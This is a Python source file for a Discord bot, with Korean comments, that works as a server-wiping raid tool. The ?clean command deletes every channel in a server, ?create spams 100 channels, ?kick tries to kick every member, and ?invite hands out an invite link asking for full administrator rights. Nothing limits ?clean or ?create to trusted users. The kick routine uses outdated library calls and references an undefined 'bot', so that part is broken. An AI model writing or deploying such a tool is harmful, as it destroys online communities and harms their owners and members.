#머리

import discord, asyncio
from discord.ext import commands
import os

client = commands.Bot(command_prefix = '?')

@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="튀엣"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)

@client.command()
async def clean(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()
        
@client.command()
async def invite(ctx):
    await ctx.send("튀엣 \n https://discord.com/api/oauth2/authorize?client_id=819929289759653928&permissions=8&scope=bot")

@client.command()
async def create(ctx):
     for i in range(100):
        await ctx.guild.create_text_channel("튀엣")

@client.command(pass_context=True)
async def kick(ctx):
    if ctx.message.author.server_permissions.administrator and ctx.message.server.me.server_permissions.kick_members:
        for member in ctx.message.server.members:
            if member != ctx.message.author and member != ctx.message.server.me:
                await client.kick(member)
        await bot.say('튀엣')
    else:
        await bot.say('헤으응')
        
@client.command()
async def cmd(ctx):
    await ctx.send("튀엣 \n ?cmd \n ?clean \n ?create \n ?invite \n ?kick")
                   
client.run(os.environ['token'])
